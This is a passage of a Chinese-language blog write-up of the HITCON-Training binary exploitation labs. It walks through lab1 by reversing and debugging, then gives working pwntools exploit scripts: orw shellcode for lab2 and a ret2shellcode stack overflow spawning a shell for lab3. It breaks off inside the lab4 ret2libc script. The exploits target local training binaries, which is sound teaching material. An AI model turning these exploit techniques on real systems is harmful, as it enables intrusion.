@@ -1,0 +1,1362 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="关于这些题，我只某次偶然在某HITCON大佬的github上发现的，下面是链接。 https://github.com/scwuaptx/HITCON-Training 已完结。">
+<meta name="keywords" content="PWN,HITCON-training">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON-training writeup">
+<meta property="og:url" content="https://veritas501.github.io/2017/05/23/HITCON-training writeup/index.html">
+<meta property="og:site_name" content="Veritas501&#39;s Blog">
+<meta property="og:description" content="关于这些题，我只某次偶然在某HITCON大佬的github上发现的，下面是链接。 https://github.com/scwuaptx/HITCON-Training 已完结。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_d512af64c3ad24bf2f609d36b8812c17.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_c9168feb33cd043cb8f4aa0ea41b04af.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_77d04dd334f9ead05254dd9b2c9b6b04.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_9a233a76f4a688c91ddb98c1e02df4c1.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_5814812717d86cdcc11e375d0bd3a009.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_dc8b420ecb02f735cb075aec63d3599f.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_ff4d9427920f8c7b715464a88a1ac683.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_e11920149f2637ec0465fc0c9fc506a2.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_9a64cf53f92d6872e223418cdb55078b.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_b23fc4f0b4575456d17d035aebf73264.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_a46533b9b3adb7a091513698fd0ffcc6.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_230a2428a0920ba8ff575f047dcd096f.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_43e7b4b8a3170e430a30808c068b8bb1.png">
+<meta property="og:updated_time" content="2017-08-25T05:41:23.049Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON-training writeup">
+<meta name="twitter:description" content="关于这些题，我只某次偶然在某HITCON大佬的github上发现的，下面是链接。 https://github.com/scwuaptx/HITCON-Training 已完结。">
+<meta name="twitter:image" content="http://ordvwjm69.bkt.clouddn.com/hitcon_training_d512af64c3ad24bf2f609d36b8812c17.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://veritas501.github.io/2017/05/23/HITCON-training writeup/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>HITCON-training writeup | Veritas501's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Veritas501's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-guestbook">
+    <a href="/Guestbook" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />guestbook</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2017/05/23/HITCON-training writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Veritas501">
+      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
+      <meta itemprop="image" content="/images/215.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veritas501's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HITCON-training writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-05-23 00:00:00" itemprop="dateCreated datePublished" datetime="2017-05-23T00:00:00+08:00">2017-05-23</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2017-08-25 13:41:23" itemprop="dateModified" datetime="2017-08-25T13:41:23+08:00">2017-08-25</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/05/23/HITCON-training writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2017/05/23/HITCON-training writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/05/23/HITCON-training writeup/" class="leancloud_visitors" data-flag-title="HITCON-training writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>关于这些题，我只某次偶然在某HITCON大佬的github上发现的，下面是链接。</p>
+<p><a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="noopener">https://github.com/scwuaptx/HITCON-Training</a></p>
+<p>已完结。</p>
+<a id="more"></a>
+<hr>
+<h2 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h2><ul>
+<li>Basic Knowledge<ul>
+<li>Introduction<ul>
+<li>Reverse Engineering<ul>
+<li>Static Analysis</li>
+<li>Dynamic Analysis </li>
+</ul>
+</li>
+<li>Exploitation</li>
+<li>Useful Tool<ul>
+<li>IDA PRO</li>
+<li>GDB</li>
+<li>Pwntool</li>
+</ul>
+</li>
+<li>lab 1 - sysmagic</li>
+</ul>
+</li>
+<li>Section</li>
+<li>Compile,linking,assmbler</li>
+<li>Execution<ul>
+<li>how program get run</li>
+<li>Segment </li>
+</ul>
+</li>
+<li>x86 assembly<ul>
+<li>Calling convention </li>
+<li>lab 2 - open/read/write</li>
+<li>shellcoding</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Stack Overflow<ul>
+<li>Buffer Overflow</li>
+<li>Return to Text/Shellcode<ul>
+<li>lab 3 - ret2shellcode </li>
+</ul>
+</li>
+<li>Protection<ul>
+<li>ASLR/DEP/PIE/StackGuard</li>
+</ul>
+</li>
+<li>Lazy binding</li>
+<li>Return to Library<ul>
+<li>lab 4 - ret2lib </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Return Oriented Programming<ul>
+<li>ROP<ul>
+<li>lab 5 - simple rop </li>
+</ul>
+</li>
+<li>Using ROP bypass ASLR<ul>
+<li>ret2plt</li>
+</ul>
+</li>
+<li>Stack migration<ul>
+<li>lab 6 - migration</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Format String Attack<ul>
+<li>Format String </li>
+<li>Read from arbitrary memory<ul>
+<li>lab 7 - crack</li>
+</ul>
+</li>
+<li>Write to arbitrary memory<ul>
+<li>lab 8 - craxme</li>
+</ul>
+</li>
+<li>Advanced Trick<ul>
+<li>EBP chain </li>
+<li>lab 9 - playfmt </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>x64 Binary Exploitation</p>
+<ul>
+<li>x64 assembly</li>
+<li>ROP</li>
+<li>Format string Attack</li>
+</ul>
+</li>
+<li><p>Heap exploitation</p>
+<ul>
+<li>Glibc memory allocator overview</li>
+<li>Vulnerablility on heap<ul>
+<li>Use after free<ul>
+<li>lab 10 - hacknote</li>
+</ul>
+</li>
+<li>Heap overflow <ul>
+<li>house of force <ul>
+<li>lab 11 - 1 - bamboobox1</li>
+</ul>
+</li>
+<li>unlink<ul>
+<li>lab 11 - 2 - bamboobox2</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Advanced heap exploitation<ul>
+<li>Fastbin attack<ul>
+<li>lab 12 - babysecretgarden </li>
+</ul>
+</li>
+<li>Shrink the chunk</li>
+<li>Extend the chunk<ul>
+<li>lab 13 -  heapcreator</li>
+</ul>
+</li>
+<li>Unsortbin attack<ul>
+<li>lab 14 - magicheap</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>C++ Exploitation<ul>
+<li>Name Mangling </li>
+<li>Vtable fucntion table</li>
+<li>Vector &amp; String</li>
+<li>New &amp; delete</li>
+<li>Copy constructor &amp; assignment operator<ul>
+<li>lab 15 - zoo </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>反正慢慢来吧。</p>
+<hr>
+<h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><p>一开始以为是pwn，最后用逆向的方法得到flag以后才知道这题本来就不打算当你用pwn的方法做的2333。就是想让你用用gdb，ida什么的。</p>
+<h3 id="纯逆向"><a href="#纯逆向" class="headerlink" title="纯逆向"></a>纯逆向</h3><p>这就没什么好说的了，简单的异或而已。</p>
+<h3 id="用IDA的patch"><a href="#用IDA的patch" class="headerlink" title="用IDA的patch"></a>用IDA的patch</h3><p>首先我建议你到网上去搜一下一个叫keypatch的IDA插件，虽然并不是一定要用到。</p>
+<p>根据逻辑，patch这句：</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_d512af64c3ad24bf2f609d36b8812c17.png" alt=""></p>
+<p>有keypatch的直接ctrl+alt+k唤出patch窗口,改成nop。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_c9168feb33cd043cb8f4aa0ea41b04af.png" alt=""></p>
+<p>保存</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_77d04dd334f9ead05254dd9b2c9b6b04.png" alt=""><br>然后随便跑一遍就出flag了。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_9a233a76f4a688c91ddb98c1e02df4c1.png" alt=""></p>
+<h3 id="用gdb动态调试做"><a href="#用gdb动态调试做" class="headerlink" title="用gdb动态调试做"></a>用gdb动态调试做</h3><p>大致方法：</p>
+<p>先运行<code>sysmagic</code>,不要输入数字；<br>新开一个窗口，<code>ps -aux |grep sysmagic</code>，得到pid = xxxx；<br>然后<code>gdb attach xxxx</code>（可能需要sudo）;<br><code>b*0x08048720</code>对0x08048720下断点；<br>输出数字，gdb断下；<br>输入<code>set $eip = 08048724</code>，直接跳过jne；<br><code>c</code>继续执行，看到有flag弹出。</p>
+<p>大致如图（我当时用了socat，其实第一步直接运行就好了）：</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_5814812717d86cdcc11e375d0bd3a009.png" alt=""></p>
+<hr>
+<h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><p>保护：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/veritas/pwn/HITCON-Training/LAB/lab2/orw.bin&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>代码倒是简单，</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_dc8b420ecb02f735cb075aec63d3599f.png" alt=""></p>
+<p>直接让你输入shellcode然后程序就去执行你的shellcode，但正如这道题的名字orw，获取flag的方法是用open,read,write三个syscall来完成的。</p>
+<p>但为什么不能用拿shell的方式做？orw_seccomp()中的代码是这样的。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_ff4d9427920f8c7b715464a88a1ac683.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PRCTL(2)                   Linux Programmer&apos;s Manual                  PRCTL(2)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       prctl - operations on a process</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/prctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int prctl(int option, unsigned long arg2, unsigned long arg3,</span><br><span class="line">                 unsigned long arg4, unsigned long arg5);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       prctl()  is  called  with  a first argument describing what to do (with</span><br><span class="line">       values defined in &lt;linux/prctl.h&gt;), and further arguments with  a  sig‐</span><br><span class="line">       nificance depending on the first one.  The first argument can be:`</span><br><span class="line">       。。。。。</span><br></pre></td></tr></table></figure>
+<p>他是一个控制进程的函数，根据说明<code>with values defined in &lt;linux/prctl.h&gt;</code>，我们<code>cat /usr/include/linux/ptctl.h</code></p>
+<p>38的含义是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span><br><span class="line"> * execve) will either fail or not grant them.  This affects suid/sgid,</span><br><span class="line"> * file capabilities, and LSMs.</span><br><span class="line"> *</span><br><span class="line"> * Operations that merely manipulate or drop existing privileges (setresuid,</span><br><span class="line"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span><br><span class="line"> *</span><br><span class="line"> * Changing LSM security domain is considered a new privilege.  So, for example,</span><br><span class="line"> * asking selinux for a specific new context (e.g. with runcon) will result</span><br><span class="line"> * in execve returning -EPERM.</span><br><span class="line"> *</span><br><span class="line"> * See Documentation/prctl/no_new_privs.txt for more details.</span><br><span class="line"> */</span><br><span class="line">#define PR_SET_NO_NEW_PRIVS	38</span><br><span class="line">#define PR_GET_NO_NEW_PRIVS	39</span><br><span class="line"></span><br><span class="line">#define PR_GET_TID_ADDRESS	40</span><br><span class="line"></span><br><span class="line">#define PR_SET_THP_DISABLE	41</span><br><span class="line">#define PR_GET_THP_DISABLE	42</span><br></pre></td></tr></table></figure></p>
+<p>22的含义是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* Get/set process seccomp mode */</span><br><span class="line">#define PR_GET_SECCOMP	21</span><br><span class="line">#define PR_SET_SECCOMP	22</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_SECCOMP (since Linux 2.6.23)</span><br><span class="line">              Set the secure computing (seccomp) mode for the calling</span><br><span class="line">              thread, to limit the available system calls.  The more recent</span><br><span class="line">              seccomp(2) system call provides a superset of the</span><br><span class="line">              functionality of PR_SET_SECCOMP.</span><br><span class="line"></span><br><span class="line">              The seccomp mode is selected via arg2.  (The seccomp constants</span><br><span class="line">              are defined in &lt;linux/seccomp.h&gt;.)</span><br><span class="line"></span><br><span class="line">              With arg2 set to SECCOMP_MODE_STRICT, the only system calls</span><br><span class="line">              that the thread is permitted to make are read(2), write(2),</span><br><span class="line">              _exit(2) (but not exit_group(2)), and sigreturn(2).  Other</span><br><span class="line">              system calls result in the delivery of a SIGKILL signal.</span><br><span class="line">              Strict secure computing mode is useful for number-crunching</span><br><span class="line">              applications that may need to execute untrusted byte code,</span><br><span class="line">              perhaps obtained by reading from a pipe or socket.  This</span><br><span class="line">              operation is available only if the kernel is configured with</span><br><span class="line">              CONFIG_SECCOMP enabled.</span><br><span class="line"></span><br><span class="line">              With arg2 set to SECCOMP_MODE_FILTER (since Linux 3.5), the</span><br><span class="line">              system calls allowed are defined by a pointer to a Berkeley</span><br><span class="line">              Packet Filter passed in arg3.  This argument is a pointer to</span><br><span class="line">              struct sock_fprog; it can be designed to filter arbitrary</span><br><span class="line">              system calls and system call arguments.  This mode is</span><br><span class="line">              available only if the kernel is configured with</span><br><span class="line">              CONFIG_SECCOMP_FILTER enabled.</span><br><span class="line"></span><br><span class="line">              If SECCOMP_MODE_FILTER filters permit fork(2), then the</span><br><span class="line">              seccomp mode is inherited by children created by fork(2); if</span><br><span class="line">              execve(2) is permitted, then the seccomp mode is preserved</span><br><span class="line">              across execve(2).  If the filters permit prctl() calls, then</span><br><span class="line">              additional filters can be added; they are run in order until</span><br><span class="line">              the first non-allow result is seen.</span><br><span class="line"></span><br><span class="line">              For further information, see the kernel source file</span><br><span class="line">              Documentation/prctl/seccomp_filter.txt.</span><br></pre></td></tr></table></figure>
+<p>也就是说，22号限制了我们syscall的调用，具体限制了那些，怎么限制，由于水平不够，就没有再深入理解了。</p>
+<p>使用open,read,write这三个syscall来cat flag，就是在练习shellcode的编写。</p>
+<p>poc如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">bin = ELF(<span class="string">'orw.bin'</span>)</span><br><span class="line">cn = process(<span class="string">'./orw.bin'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">push 1;</span></span><br><span class="line"><span class="string">dec byte ptr [esp];</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">xor eax,eax;</span></span><br><span class="line"><span class="string">mov al,0x5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,eax;</span></span><br><span class="line"><span class="string">xor eax,eax;</span></span><br><span class="line"><span class="string">mov al,0x3;</span></span><br><span class="line"><span class="string">mov ecx,esp;</span></span><br><span class="line"><span class="string">mov dl,0x30;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov al,0x4;</span></span><br><span class="line"><span class="string">mov bl,1;</span></span><br><span class="line"><span class="string">mov dl,0x30;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fp = open("flag",0)</span></span><br><span class="line"><span class="string">read(fp,buf,0x30)</span></span><br><span class="line"><span class="string">write(1,buf,0x30)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">cn.sendline(asm(shellcode))</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/veritas/pwn/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>简单的ret2sc，不想多说，但有一点要注意，</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_e11920149f2637ec0465fc0c9fc506a2.png" alt=""></p>
+<p>这里他是用esp寄存器而不是ebp寄存器，所以计算padding的时候要用</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_9a64cf53f92d6872e223418cdb55078b.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line">bin = ELF(&apos;ret2sc&apos;)</span><br><span class="line"></span><br><span class="line">cn = process(&apos;./ret2sc&apos;)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(asm(shellcraft.linux.sh()))</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">cn.sendline(&apos;a&apos;*0x1c+&apos;bbbb&apos;+p32(0x0804A060))</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h2><p>非常基础的ret2libc，不多解释了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span 